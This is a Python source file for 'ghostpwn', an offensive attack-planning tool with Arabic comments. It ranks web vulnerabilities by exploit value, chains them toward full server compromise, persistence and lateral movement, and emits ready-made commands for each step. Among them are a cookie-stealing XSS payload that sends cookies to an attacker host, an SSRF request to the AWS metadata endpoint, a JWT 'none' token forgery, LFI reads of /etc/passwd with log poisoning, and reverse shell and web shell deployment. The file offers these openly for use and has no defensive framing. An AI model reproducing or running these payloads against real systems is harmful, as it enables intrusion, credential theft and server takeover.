#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - AI Attack Planner
مخطط هجوم ذكي - يحلل الثغرات ويخطط أفضل path للوصول للهدف

الذكاء:
1. يحلل كل ثغرة ويحدد قيمتها
2. يبني attack tree
3. يختار أفضل chain (أقل خطورة، أعلى نجاح)
4. يتكيف مع النتائج
5. يتعلم من الفشل والنجاح
"""
import sys
import os
import json
from typing import Dict, List, Optional, Set, Tuple
from enum import Enum

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.arabic_display import SmartLogger, Colors, fix_display
from modules.exploit_chain import ExploitChainEngine, VULN_CAPABILITIES, CHAIN_PATTERNS


# ============================ Attack Goals ============================
class AttackGoal(Enum):
    """أهداف الهجوم"""
    RECON = "استطلاع"
    DATA_BREACH = "اختراق بيانات"
    ACCOUNT_TAKEOVER = "اختطاف حساب"
    ADMIN_ACCESS = "وصول admin"
    RCE = "تنفيذ أوامر عن بعد"
    FULL_COMPROMISE = "اختراق كامل للسيرفر"
    PERSISTENCE = "تثبيت الوصول"
    LATERAL_MOVEMENT = "الانتقال للشبكة"


# ============================ Vuln Priority Scoring ============================
VULN_PRIORITY = {
    "command_injection": 100,      # أعلى أولوية - RCE مباشر
    "ssti": 95,                    # RCE عبر templates
    "sql_injection_error": 90,     # وصول DB
    "lfi": 85,                     # قراءة ملفات
    "file_upload": 80,             # رفع shell
    "xxe": 75,                     # قراءة ملفات + SSRF
    "ssrf": 70,                    # وصول داخلي
    "jwt_none_algorithm": 65,      # تجاوز مصادقة
    "git_exposed": 60,             # source code
    "exposed_backup": 55,          # source + DB
    "sql_injection_boolean": 50,   # blind SQLi
    "sql_injection_time": 45,      # time-based (بطيء)
    "xss_reflected": 40,           # client-side
    "idor": 35,                    # وصول لبيانات
    "cors_wildcard_credentials": 30,
    "open_redirect": 25,
    "subdomain_takeover": 20,
    "weak_credentials": 15,
    "clickjacking": 10,
    "missing_security_header": 5,
    "waf_detected": 0,
    "no_waf": 5,
}


# ============================ Attack Planner ============================
class AttackPlanner:
    """مخطط هجوم ذكي"""

    def __init__(self, audit_logger=None):
        self.audit = audit_logger
        self.logger = SmartLogger()
        self.chain_engine = ExploitChainEngine(audit_logger)

        # الهدف النهائي
        self.goal = AttackGoal.FULL_COMPROMISE

        # الـ state
        self.current_capabilities = set()
        self.attack_history = []
        self.failed_attempts = []
        self.successful_steps = []

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[PLANNER] {msg}", level)

    def set_goal(self, goal: AttackGoal):
        """تحديد هدف الهجوم"""
        self.goal = goal
        self._log(f"الهدف: {goal.value}", "info")

    def analyze_vulns(self, vulns: List[Dict]) -> Dict:
        """تحليل الثغرات وتخطيط الهجوم"""
        self._log("تحليل الثغرات وتخطيط الهجوم...", "phase")

        # إضافة الثغرات للـ chain engine
        for vuln in vulns:
            self.chain_engine.add_vuln(vuln)

        # ترتيب الثغرات حسب الأولوية
        sorted_vulns = sorted(
            vulns,
            key=lambda v: VULN_PRIORITY.get(v.get("type", ""), 0),
            reverse=True
        )

        # إيجاد chains
        chains = self.chain_engine.find_chains()

        # التوصية بأفضل chain
        best_chain = self._select_best_chain(chains)

        # بناء attack plan
        plan = self._build_attack_plan(sorted_vulns, chains, best_chain)

        return plan

    def _select_best_chain(self, chains: List[Dict]) -> Optional[Dict]:
        """اختيار أفضل chain"""
        if not chains:
            return None

        # نفضّل chains جاهزة
        ready_chains = [c for c in chains if c["ready"]]
        if ready_chains:
            # نختار الأعلى خطورة (أقرب للهدف)
            sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
            ready_chains.sort(key=lambda c: sev_order.get(c["severity"], 4))
            return ready_chains[0]

        # لو مفيش chains جاهزة، نختار الأعلى نسبة تنفيذ
        chains.sort(key=lambda c: c["executability"], reverse=True)
        return chains[0] if chains else None

    def _build_attack_plan(self, sorted_vulns: List[Dict],
                          chains: List[Dict], best_chain: Optional[Dict]) -> Dict:
        """بناء خطة الهجوم"""
        plan = {
            "goal": self.goal.value,
            "total_vulns": len(sorted_vulns),
            "chains_found": len(chains),
            "best_chain": best_chain,
            "attack_steps": [],
            "priority_vulns": [],
            "missing_for_goal": [],
        }

        # تحديد الثغرات عالية الأولوية
        for vuln in sorted_vulns[:5]:  # أهم 5
            priority = VULN_PRIORITY.get(vuln.get("type", ""), 0)
            if priority >= 50:
                plan["priority_vulns"].append({
                    "type": vuln.get("type"),
                    "priority": priority,
                    "url": vuln.get("url", ""),
                    "reason": self._get_priority_reason(vuln.get("type")),
                })

        # بناء خطوات الهجوم
        if best_chain:
            for i, step in enumerate(best_chain["steps"], 1):
                if step["available"]:
                    plan["attack_steps"].append({
                        "step": i,
                        "action": step["action"],
                        "vuln_type": step["vuln"],
                        "status": "ready",
                        "command": self._get_command_for_step(step),
                    })
                else:
                    plan["missing_for_goal"].append({
                        "step": i,
                        "needed_vuln": step["vuln"],
                        "action": step["action"],
                    })

        return plan

    def _get_priority_reason(self, vuln_type: str) -> str:
        """سبب أولوية الثغرة"""
        reasons = {
            "command_injection": "RCE مباشر - أعلى خطورة",
            "ssti": "RCE عبر templates - أخطر من XSS",
            "sql_injection_error": "وصول كامل لقاعدة البيانات",
            "lfi": "قراءة ملفات حساسة + log poisoning لـ RCE",
            "file_upload": "رفع web shell = RCE",
            "xxe": "قراءة ملفات + SSRF + RCE محتمل",
            "ssrf": "وصول للشبكة الداخلية + cloud creds",
            "jwt_none_algorithm": "تجاوز المصادقة = admin access",
            "git_exposed": "كود مصدر + secrets في history",
            "exposed_backup": "كود + قاعدة بيانات",
        }
        return reasons.get(vuln_type, "ثغرة قابلة للاستغلال")

    def _get_command_for_step(self, step: Dict) -> str:
        """الحصول على أمر التنفيذ للخطوة"""
        vuln = step["vuln"]
        action = step["action"]

        commands = {
            ("sql_injection_error", "dump users table"): "python3 ghostpwn.py --dump-db URL",
            ("lfi", "verify LFI with /etc/passwd"): "python3 -m modules.exploit --type lfi-read --target URL --param file --file /etc/passwd",
            ("lfi", "poison access log with PHP payload"): "python3 -m modules.exploit --type lfi-log --target URL --param file",
            ("command_injection", "deploy reverse shell"): "python3 ghostpwn.py --deploy-shell --listener-ip IP",
            ("xss_reflected", "craft cookie-stealing payload"): "<script>document.location='http://ATTACKER/?c='+document.cookie</script>",
            ("ssrf", "access AWS metadata endpoint"): "python3 -m modules.exploit --type ssrf --target URL?param=http://169.254.169.254/latest/meta-data/",
            ("git_exposed", "download .git directory"): "git-dumper URL/.git output_dir",
            ("jwt_none_algorithm", "forge admin token"): "python3 -c \"import jwt; print(jwt.encode({'admin':True},'',algorithm='none'))\"",
            ("file_upload", "upload web shell"): "python3 -m modules.exploit --type upload --target URL",
            ("idor", "enumerate user IDs"): "for i in $(seq 1 100); do curl URL?user=$i; done",
        }

        return commands.get((vuln, action), f"# Execute: {action}")

    def print_attack_plan(self, plan: Dict):
        """عرض خطة الهجوم"""
        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")
        print(f"{Colors.MAGENTA}  🧠 خطة الهجوم الذكية{Colors.NC}")
        print(f"{Colors.MAGENTA}{'='*60}{Colors.NC}")

        print(f"\n  {Colors.BOLD}🎯 الهدف:{Colors.NC} {fix_display(plan['goal'])}")
        print(f"  {Colors.BOLD}📊 الثغرات:{Colors.NC} {plan['total_vulns']}")
        print(f"  {Colors.BOLD}🔗 Chains:{Colors.NC} {plan['chains_found']}")

        # الثغرات عالية الأولوية
        if plan["priority_vulns"]:
            print(f"\n  {Colors.BOLD}⚡ الثغرات عالية الأولوية:{Colors.NC}")
            for i, pv in enumerate(plan["priority_vulns"], 1):
                color = Colors.RED if pv["priority"] >= 80 else Colors.YELLOW
                print(f"    {color}{i}.{Colors.NC} {pv['type']:30s} (priority: {pv['priority']})")
                print(f"       {fix_display(pv['reason'])}")
                print(f"       URL: {pv['url'][:80]}")

        # أفضل chain
        if plan["best_chain"]:
            chain = plan["best_chain"]
            print(f"\n  {Colors.BOLD}🏆 أفضل chain:{Colors.NC}")
            print(f"    {fix_display(chain['name_ar'])}")
            print(f"    {fix_display(chain['description'])}")
            print(f"    الخطورة: {chain['severity']} | التنفيذ: {chain['executability']:.0f}%")

            print(f"\n  {Colors.BOLD}📋 خطوات التنفيذ:{Colors.NC}")
            for step in plan["attack_steps"]:
                status_color = Colors.GREEN if step["status"] == "ready" else Colors.RED
                print(f"    {status_color}{step['step']}.{Colors.NC} {step['action']}")
                print(f"       Vuln: {step['vuln_type']}")
                print(f"       Command: {Colors.CYAN}{step['command'][:80]}{Colors.NC}")

        # النواقص
        if plan["missing_for_goal"]:
            print(f"\n  {Colors.YELLOW}⚠️  نواقص لتحقيق الهدف:{Colors.NC}")
            for missing in plan["missing_for_goal"]:
                print(f"    - تحتاج: {missing['needed_vuln']} ({missing['action']})")

        # التوصية النهائية
        if plan["best_chain"] and plan["best_chain"]["ready"]:
            print(f"\n  {Colors.GREEN + Colors.BOLD}✅ الـ chain جاهز للتنفيذ!{Colors.NC}")
            print(f"     {Colors.CYAN}نفّذ: python3 ghostpwn.py --execute-chain{Colors.NC}")
        elif plan["priority_vulns"]:
            print(f"\n  {Colors.YELLOW}💡 ابدأ باستغلال الثغرات عالية الأولوية{Colors.NC}")

        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")

    def save_plan(self, plan: Dict, output_file: str):
        """حفظ خطة الهجوم"""
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(plan, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    # اختبار
    planner = AttackPlanner()
    planner.set_goal(AttackGoal.FULL_COMPROMISE)

    test_vulns = [
        {"type": "sql_injection_error", "url": "http://target.com/page?id=1", "param": "id"},
        {"type": "lfi", "url": "http://target.com/page?file=x", "param": "file"},
        {"type": "command_injection", "url": "http://target.com/page?cmd=x", "param": "cmd"},
        {"type": "xss_reflected", "url": "http://target.com/search?q=x", "param": "q"},
        {"type": "missing_security_header", "url": "http://target.com"},
    ]

    plan = planner.analyze_vulns(test_vulns)
    planner.print_attack_plan(plan)
